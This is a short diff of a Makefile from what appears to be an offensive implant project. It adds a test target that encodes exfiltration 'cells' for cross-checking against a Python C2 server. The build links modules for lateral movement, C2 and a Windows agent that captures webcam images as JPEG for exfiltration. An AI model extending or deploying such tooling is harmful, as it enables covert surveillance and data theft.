@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -57,6 +57,11 @@ $(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD
 	  $(P2PLIB) $(C2OBJS) $(LATLIB)
 
 $(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+
+# 跨语言对齐工具：C 侧走真实会话派生编码出信元流 -> 文件，
+# 供 13_c2_server（Python ExfilSink）解码比对。必须由 C 侧真编码才测得准。
+$(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
 
 # 端到端：agent_windows 采集 -> JPEG -> exfil 信元 -> 重组校验
